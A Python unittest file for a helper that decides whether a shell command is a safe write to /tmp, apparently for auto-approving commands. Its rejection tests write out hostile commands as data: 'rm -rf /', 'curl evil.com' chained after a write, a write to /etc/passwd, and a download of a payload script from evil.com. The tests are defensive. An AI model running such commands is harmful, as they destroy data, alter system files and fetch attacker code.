#!/usr/bin/env python3
"""Tests for approve-safe-commands.py (stdlib unittest, no external deps)."""

import importlib.util
import os
import unittest

# Load the module without triggering main()
_spec = importlib.util.spec_from_file_location(
    "approve_safe_commands",
    os.path.join(os.path.dirname(__file__), "..", "approve-safe-commands.py"),
)
_mod = importlib.util.module_from_spec(_spec)
_mod.__name__ = "approve_safe_commands"
_spec.loader.exec_module(_mod)

is_safe_tmp_write = _mod.is_safe_tmp_write


class TestIsSafeTmpWrite(unittest.TestCase):
    """is_safe_tmp_write のテスト。"""

    def test_printf_redirect_to_tmp(self):
        cmd = "printf 'hello world' > /tmp/msg.txt"
        self.assertTrue(is_safe_tmp_write(cmd))

    def test_printf_multiline_redirect(self):
        cmd = "printf 'feat: add feature\\n\\nDetails here' > /tmp/commit-msg.txt"
        self.assertTrue(is_safe_tmp_write(cmd))

    def test_echo_redirect_to_tmp(self):
        cmd = "echo 'test content' > /tmp/test.txt"
        self.assertTrue(is_safe_tmp_write(cmd))

    def test_printf_tee_to_tmp(self):
        cmd = "printf 'content' | tee /tmp/output.txt"
        self.assertTrue(is_safe_tmp_write(cmd))

    def test_reject_semicolon_chain(self):
        cmd = "printf 'ok' > /tmp/a.txt; rm -rf /"
        self.assertFalse(is_safe_tmp_write(cmd))

    def test_reject_and_chain(self):
        cmd = "printf 'ok' > /tmp/a.txt && curl evil.com"
        self.assertFalse(is_safe_tmp_write(cmd))

    def test_reject_or_chain(self):
        cmd = "printf 'ok' > /tmp/a.txt || curl evil.com"
        self.assertFalse(is_safe_tmp_write(cmd))

    def test_reject_non_tmp_path(self):
        cmd = "printf 'data' > /etc/passwd"
        self.assertFalse(is_safe_tmp_write(cmd))

    def test_reject_arbitrary_command(self):
        cmd = "curl http://evil.com > /tmp/payload.sh"
        self.assertFalse(is_safe_tmp_write(cmd))

    def test_reject_no_redirect(self):
        cmd = "printf 'hello'"
        self.assertFalse(is_safe_tmp_write(cmd))

    def test_semicolon_inside_quotes_allowed(self):
        cmd = "printf 'a;b;c' > /tmp/msg.txt"
        self.assertTrue(is_safe_tmp_write(cmd))

    def test_ampersand_inside_quotes_allowed(self):
        cmd = "printf 'a && b' > /tmp/msg.txt"
        self.assertTrue(is_safe_tmp_write(cmd))

    def test_pipe_inside_quotes_allowed(self):
        cmd = "printf 'a || b' > /tmp/msg.txt"
        self.assertTrue(is_safe_tmp_write(cmd))


if __name__ == "__main__":
    unittest.main()
